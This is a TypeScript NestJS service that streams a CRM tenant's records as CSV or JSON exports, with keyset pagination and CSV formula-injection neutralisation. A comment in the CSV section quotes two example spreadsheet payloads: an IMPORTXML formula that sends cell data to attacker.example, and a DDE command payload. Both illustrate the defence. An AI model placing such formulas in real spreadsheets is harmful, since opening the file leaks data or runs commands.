import { Inject, Injectable } from "@nestjs/common";
import { and, asc, eq, getTableColumns, gt, isNull } from "drizzle-orm";
import { DRIZZLE } from "../../db/drizzle.constants";
import type { Db } from "../../db/drizzle.types";
import { activities, businessParties, partyContacts, subjects } from "../../db/schema";

/**
 * Getting everything back out again.
 *
 * Deliberately ungated. Making departure easy is the argument against
 * incumbents who make it deliberately hard, and an export behind a plan tier is
 * the same lock-in with a nicer name. There is no entitlement check in this
 * file and there should never be one.
 *
 * Custom fields and activity history are included for the same reason: an
 * export that omits the parts a tenant typed themselves is not an export, it is
 * a sample.
 *
 * Which is why nothing here has a row ceiling. It used to stop at fifty
 * thousand and return what it had, so a tenant with eighty thousand parties got
 * a file that looked complete and was missing thirty thousand records — the
 * sample this docblock warns about, produced by the code under it. Every path
 * is a generator instead: one page is in memory at a time and the response is
 * written as it is read, so size bounds the download rather than the answer.
 */

/** A page at a time, so a large tenant does not become one enormous statement. */
const PAGE = 1_000;

export type ExportEntity = "parties" | "contacts" | "subjects" | "activities";
export const EXPORT_ENTITIES: readonly ExportEntity[] = [
  "parties",
  "contacts",
  "subjects",
  "activities",
];

/**
 * The key each entity is walked by, and the columns it writes.
 *
 * Columns come from the table rather than from the rows returned, so a column
 * that is null for every record in this tenant still appears in the file. The
 * old union-of-keys rule was reaching for the same guarantee and could only
 * offer it once every row was in memory.
 */
const KEY_COLUMN: Readonly<Record<ExportEntity, string>> = {
  parties: "partyId",
  contacts: "partyContactId",
  subjects: "subjectId",
  activities: "activityId",
};

const EXPORT_COLUMNS: Readonly<Record<ExportEntity, readonly string[]>> = {
  parties: Object.keys(getTableColumns(businessParties)),
  contacts: Object.keys(getTableColumns(partyContacts)),
  subjects: Object.keys(getTableColumns(subjects)),
  activities: Object.keys(getTableColumns(activities)),
};

@Injectable()
export class CrmExportService {
  constructor(@Inject(DRIZZLE) private readonly db: Db) {}

  /** One entity as CSV, in chunks a response can be written with. */
  async *csvChunks(
    organizationId: string,
    entity: ExportEntity,
  ): AsyncGenerator<string> {
    const headers = EXPORT_COLUMNS[entity];
    yield csvRow(headers);

    for await (const page of this.streamRows(organizationId, entity))
      yield `\n${page.map((row) => csvRow(headers.map((header) => row[header]))).join("\n")}`;
  }

  /** One entity as a JSON array, in chunks. */
  async *jsonChunks(
    organizationId: string,
    entity: ExportEntity,
  ): AsyncGenerator<string> {
    yield "[";

    let written = 0;
    for await (const page of this.streamRows(organizationId, entity)) {
      yield `${written > 0 ? "," : ""}${page.map((row) => JSON.stringify(row)).join(",")}`;
      written += page.length;
    }

    yield "]";
  }

  /** Every entity at once, as one document. */
  async *archiveChunks(organizationId: string): AsyncGenerator<string> {
    yield "{";

    let first = true;
    for (const entity of EXPORT_ENTITIES) {
      yield `${first ? "" : ","}${JSON.stringify(entity)}:`;
      first = false;
      yield* this.jsonChunks(organizationId, entity);
    }

    yield "}";
  }

  /**
   * Every row of one entity, a page at a time, in key order.
   *
   * Walked by primary key rather than by a growing OFFSET. Each statement in a
   * READ COMMITTED transaction takes its own snapshot, so a record inserted
   * ahead of the cursor mid-export shifts an offset window and silently skips a
   * row — and OFFSET re-scans everything before it on every page besides.
   * `WHERE key > last` does neither.
   */
  private async *streamRows(
    organizationId: string,
    entity: ExportEntity,
  ): AsyncGenerator<Record<string, unknown>[]> {
    const keyColumn = KEY_COLUMN[entity];
    let after = "";

    for (;;) {
      const rows = await this.pageAfter(organizationId, entity, after);
      if (rows.length === 0) return;

      yield rows;
      if (rows.length < PAGE) return;

      const last = rows[rows.length - 1]?.[keyColumn];
      // A primary key is never null; stopping rather than looping on a cursor
      // that cannot advance is the safe reading of "never".
      if (typeof last !== "string" || last === "") return;
      after = last;
    }
  }

  private async pageAfter(
    organizationId: string,
    entity: ExportEntity,
    after: string,
  ): Promise<Record<string, unknown>[]> {
    switch (entity) {
      case "parties":
        return this.db
          .select()
          .from(businessParties)
          .where(
            and(
              eq(businessParties.organizationId, organizationId),
              isNull(businessParties.deletedAt),
              gt(businessParties.partyId, after),
            ),
          )
          .orderBy(asc(businessParties.partyId))
          .limit(PAGE);

      case "contacts":
        return this.db
          .select()
          .from(partyContacts)
          .where(
            and(
              eq(partyContacts.organizationId, organizationId),
              isNull(partyContacts.deletedAt),
              gt(partyContacts.partyContactId, after),
            ),
          )
          .orderBy(asc(partyContacts.partyContactId))
          .limit(PAGE);

      case "subjects":
        return this.db
          .select()
          .from(subjects)
          .where(
            and(
              eq(subjects.organizationId, organizationId),
              isNull(subjects.deletedAt),
              gt(subjects.subjectId, after),
            ),
          )
          .orderBy(asc(subjects.subjectId))
          .limit(PAGE);

      case "activities":
        return this.db
          .select()
          .from(activities)
          .where(
            and(
              eq(activities.organizationId, organizationId),
              isNull(activities.deletedAt),
              gt(activities.activityId, after),
            ),
          )
          .orderBy(asc(activities.activityId))
          .limit(PAGE);
    }
  }
}

/**
 * CSV that survives a round trip.
 *
 * The rules here are the ones people actually get wrong: a value containing a
 * comma, a quote or a newline has to be quoted and its quotes doubled, or the
 * file silently gains columns when it is read back. A JSONB column is written
 * as JSON rather than as `[object Object]`.
 */
export function csvRow(cells: readonly unknown[]): string {
  return cells.map(csvCell).join(",");
}

/**
 * Cells a spreadsheet would run instead of showing.
 *
 * Excel and Sheets read a leading `=`, `+`, `-` or `@` as the start of a
 * formula, and a leading tab or carriage return slips past a check for those
 * before the spreadsheet strips it. Quoting does not help: the CSV parser
 * removes the quotes and the cell still begins with `=`.
 *
 * This is not a theoretical exposure. Anyone who can create a party can choose
 * its name, and inbound mail ingestion creates parties from sender display
 * names — so the text in this column is attacker-controlled, not "what our own
 * users typed". `=IMPORTXML(CONCAT("http://attacker.example/?v=";A2);"//a")`
 * exfiltrates the cell beside it the moment an admin opens the file, and
 * `=cmd|'/c ...'!A1` is a DDE payload. A leading apostrophe is what tells a
 * spreadsheet the cell is text.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * A plain number is not a formula, and prefixing every negative amount would
 * corrupt the export this rule exists to protect. `-1+1` is not a plain number
 * and is still prefixed.
 */
const PLAIN_NUMBER = /^-?\d+(?:\.\d+)?(?:[eE][-+]?\d+)?$/;

function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  const text =
    value instanceof Date
      ? value.toISOString()
      : typeof value === "object"
        ? JSON.stringify(value)
        : String(value);

  const neutralised =
    FORMULA_LEAD.test(text) && !PLAIN_NUMBER.test(text) ? `'${text}` : text;

  // A neutralised cell is quoted as well, so the apostrophe is unambiguously
  // part of the value rather than something a reader might trim.
  return neutralised !== text || /[",\n\r]/.test(neutralised)
    ? `"${neutralised.replace(/"/g, '""')}"`
    : neutralised;
}
